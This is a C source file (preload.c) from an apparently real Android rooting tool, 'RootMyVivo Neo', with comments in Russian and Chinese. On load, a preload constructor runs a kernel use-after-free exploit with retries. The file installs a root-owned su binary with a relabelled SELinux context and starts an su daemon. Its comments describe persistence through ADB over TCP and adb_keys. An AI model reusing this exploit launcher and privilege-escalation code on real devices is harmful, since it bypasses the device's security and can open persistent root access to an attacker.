/*
 * preload.c — LD_PRELOAD entry для RootMyVivo Neo.
 *
 * Отличия от upstream Neo11Plus:
 *   - НЕТ смены обоев и убийства system_server (главная причина
 *     «самопроизвольных» soft reboot'ов после рута).
 *   - НЕТ io-демона на порту 39555 (нужен был только отладочному kernelapp;
 *     RootMyVivo работает через su, а не через чтение памяти ядра).
 *   - НЕТ tmpfs-оверлея на /apex/com.android.virt/bin — этот хак мог
 *     завесить zygote/system_server при soft reboot (чёрный экран).
 *   - su-клиент и демон живут только в /data/local/tmp: приложение
 *     вызывает их по полному пути и само решает, что делать с рутом.
 *   - НЕТ установки boot-сервиса: закрепление после рута делает
 *     приложение (persist.adb.tcp.port + adb_keys + ksud late-load).
 *
 * Эксплойт-ядро (futex PI UAF → pipe physrw → root) не тронуто:
 * тайминги и стратегии reclaim оставлены как в проверенной сборке.
 */

#include "common.h"

/* Пути — через RMV_HOME (см. rmv_home() в util.c): приложение кладёт всё
 * в свой filesDir/rmv, старые shell-запуски — в /data/local/tmp. */
static char su_local[300];
static char su_sock[300];
static char su_log[300];
static char rmv_done[300];

static void rmv_paths_init(void) {
  static int done = 0;
  if (done) {
    return;
  }
  done = 1;
  const char *h = rmv_home();
  snprintf(su_local, sizeof(su_local), "%s/su", h);
  snprintf(su_sock, sizeof(su_sock), "%s/temp_su.sock", h);
  snprintf(su_log, sizeof(su_log), "%s/su_daemon.log", h);
  snprintf(rmv_done, sizeof(rmv_done), "%s/rmv/DONE", h);
  /* Рабочей папки rmv/ может не быть в filesDir — создаём заранее,
   * иначе DONE не запишется и приложение не отличит успех от провала. */
  char dir[300];
  snprintf(dir, sizeof(dir), "%s/rmv", h);
  mkdir(dir, 0755);
}

#define SU_LOCAL (rmv_paths_init(), su_local)
#define SU_SOCK (rmv_paths_init(), su_sock)
#define SU_LOG (rmv_paths_init(), su_log)

extern const unsigned char embedded_su_start[];
extern const unsigned char embedded_su_end[];

static int write_full(int fd, const void *buf, size_t len) {
  const unsigned char *p = buf;
  while (len) {
    ssize_t n = write(fd, p, len);
    if (n < 0 && errno == EINTR) {
      continue;
    }
    if (n <= 0) {
      return 0;
    }
    p += n;
    len -= (size_t)n;
  }
  return 1;
}

static void try_chcon(const char *path) {
  pid_t pid = fork();
  if (pid == 0) {
    execl("/system/bin/chcon", "chcon", "u:object_r:system_file:s0",
          path, (char *)NULL);
    _exit(127);
  }
  if (pid > 0) {
    while (waitpid(pid, NULL, 0) < 0 && errno == EINTR) {
    }
  }
}

/* Атомарная установка файла: tmp → chmod/chown → rename → chcon. */
static int write_embedded_file(const char *dst, mode_t mode) {
  char tmp[256];
  snprintf(tmp, sizeof(tmp), "%s.new.%d", dst, getpid());
  unlink(tmp);

  size_t size = (size_t)(embedded_su_end - embedded_su_start);
  int fd = open(tmp, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) {
    return 0;
  }
  int ok = write_full(fd, embedded_su_start, size);
  int saved_errno = errno;
  if (ok) {
    ok = fchown(fd, 0, 0) == 0 && fchmod(fd, mode) == 0;
    saved_errno = errno;
  }
  if (close(fd) != 0 && ok) {
    ok = 0;
    saved_errno = errno;
  }
  if (!ok) {
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }

  try_chcon(tmp);
  if (rename(tmp, dst) != 0) {
    saved_errno = errno;
    unlink(tmp);
    errno = saved_errno;
    return 0;
  }
  try_chcon(dst);
  pr_success("embedded su wrote %zu bytes to %s\n", size, dst);
  return 1;
}

static pid_t start_su_daemon(void) {
  unlink(SU_SOCK);
  unlink(SU_LOG);

  pid_t pid = fork();
  if (pid == 0) {
    setsid();
    int null_fd = open("/dev/null", O_RDONLY | O_CLOEXEC);
    if (null_fd >= 0) {
      dup2(null_fd, STDIN_FILENO);
    }
    int log_fd = open(SU_LOG, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
    if (log_fd >= 0) {
      dup2(log_fd, STDOUT_FILENO);
      dup2(log_fd, STDERR_FILENO);
    }

    long max_fd = sysconf(_SC_OPEN_MAX);
    if (max_fd < 0 || max_fd > 65536) {
      max_fd = 65536;
    }
    for (int fd = STDERR_FILENO + 1; fd < max_fd; fd++) {
      close(fd);
    }
    execl(SU_LOCAL, "su", "--daemon", (char *)NULL);
    _exit(127);
  }
  return pid;
}

/*
 * Установка su: бинарник-клиент <RMV_HOME>/su + фоновый демон с сокетом.
 * Никаких /apex, никаких mount-namespace игр с adbd: приложение знает
 * путь к своему RMV_HOME и вызывает клиент само.
 */
int install_embedded_su(pid_t *daemon_pid) {
  if (daemon_pid) {
    *daemon_pid = -1;
  }

  if (!write_embedded_file(SU_LOCAL, 0755)) {
    return 0;
  }

  pid_t pid = start_su_daemon();
  if (pid <= 0) {
    return 0;
  }
  if (daemon_pid) {
    *daemon_pid = pid;
  }

  for (int i = 0; i < 50; i++) {
    if (access(SU_SOCK, F_OK) == 0) {
      pr_success("embedded su daemon ready pid=%d socket=%s\n", pid, SU_SOCK);
      return 1;
    }
    usleep(100000);
  }

  errno = ETIMEDOUT;
  return 0;
}

/*
 * Полный прогон эксплойта. При неудаче (reclaim не сложился, cred-guard
 * сработал, CFI-путь не прошёл) — повтор с паузой: тайминги каждый раз
 * чуть разные, вторая-третья попытка часто проходит. Максимум попыток
 * и пауза настраиваются окружением RMV_ATTEMPTS / RMV_RETRY_DELAY.
 */
#define RMV_DONE (rmv_paths_init(), rmv_done)

static void write_done(int ok) {
  int fd = open(RMV_DONE, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
  if (fd >= 0) {
    char c = ok ? '1' : '0';
    write(fd, &c, 1);
    close(fd);
  }
}

static int run_with_retries(void) {
  unlink(RMV_DONE);
  char *argv[2] = {"preload.so", NULL};

  /* Upstream (Neo11Plus) делает ОДИН прогон на вызов — и потому «не
   * лагает»: каждый прогон заново гоняет KernelSnitch-спрей (сотни
   * форков). Ночная статистика PD2520: тёплое ядро — успех с 1-й,
   * свежее — со 2-3-й. Компромисс: 3 попытки, пауза 15с (система
   * успевает выдохнуть между спреями). Дефолт; каталог может
   * переопределить через RMV_ATTEMPTS / RMV_RETRY_DELAY. */
  int max_attempts = 3;
  const char *a = getenv("RMV_ATTEMPTS");
  if (a && atoi(a) > 0) {
    max_attempts = atoi(a);
  }
  int delay_sec = 15;
  const char *d = getenv("RMV_RETRY_DELAY");
  if (d && atoi(d) >= 0) {
    delay_sec = atoi(d);
  }

  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    pr_success("rmv exploit attempt %d/%d\n", attempt, max_attempts);
    /* Каждая попытка — свежий процесс: чистые потоки, слэбы, mms. */
    fflush(stdout);
    pid_t p = fork();
    if (p < 0) {
      /* fork не прошёл (NPROC/VM exhausted после KernelSnitch-спрея —
       * сотни процессов на попытку). РАНЬШЕ это не проверялось: p=-1
       * уходил в waitpid(-1, ...), который подхватывал ЛЮБОЙ чужой
       * дочерний процесс, и попытка «падала моментально» без единой
       * строки своего лога. Теперь честно логируем причину и повторяем
       * с паузой, не трогая waitpid. */
      pr_error("rmv attempt %d fork failed errno=%d (%s) — retrying\n",
               attempt, errno, strerror(errno));
      fflush(stdout);
      if (attempt < max_attempts && delay_sec > 0) {
        sleep(delay_sec);
      }
      continue;
    }
    if (p == 0) {
      /* Явная метка старта ребёнка до любых setrlimit/setvbuf: если
       * попытка умрёт на самых ранних шагах, в логе всё равно видно,
       * что прогон реально начался. */
      static const char enter[] = "[+] rmv child enter\n";
      ssize_t wr = write(STDOUT_FILENO, enter, sizeof(enter) - 1);
      (void)wr;
      _exit(run_exploit(1, argv));
    }
    int status = 0;
    while (waitpid(p, &status, 0) < 0 && errno == EINTR) {
    }
    int ret;
    if (WIFEXITED(status)) {
      ret = WEXITSTATUS(status);
    } else if (WIFSIGNALED(status)) {
      ret = 1;
      /* Раньше это молча превращалось в ret=1: падение по сигналу
       * выглядело как «обычный фейл» без причины. Теперь печатаем
       * сигнал — сразу ясно, что процесс крашнулся, а не отказал сам. */
      pr_error("rmv attempt %d killed by signal %d (%s)\n", attempt,
               WTERMSIG(status), strsignal(WTERMSIG(status)));
    } else {
      ret = 1;
      pr_error("rmv attempt %d died abnormally status=%d\n", attempt, status);
    }
    if (ret == 0) {
      write_done(1);
      return 0;
    }
    pr_error("rmv attempt %d failed (ret=%d)\n", attempt, ret);
    if (attempt < max_attempts && delay_sec > 0) {
      pr_info("rmv retrying in %ds…\n", delay_sec);
      fflush(stdout);
      sleep(delay_sec);
    }
  }
  write_done(0);
  return 1;
}

__attribute__((constructor)) static void load(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  setvbuf(stdout, NULL, _IOLBF, 0);
  setvbuf(stderr, NULL, _IOLBF, 0);
  unsetenv("LD_PRELOAD");

  /* [app-side probe 2026-10-01] 环境探针模式：只测试调度类 syscall 可用性，
     不做任何内核操作。App 侧据此在运行漏洞利用前做安全预检。 */
  if (getenv("RMV_PROBE_ONLY")) {
    rmv_sched_probe();
    fflush(stdout);
    fflush(stderr);
    _exit(0);
  }

  pr_success("rmv preload starting pid=%d\n", getpid());
  run_with_retries();
  /* Всё после рута (закрепление, KernelSU, менеджер) делает приложение. */
}
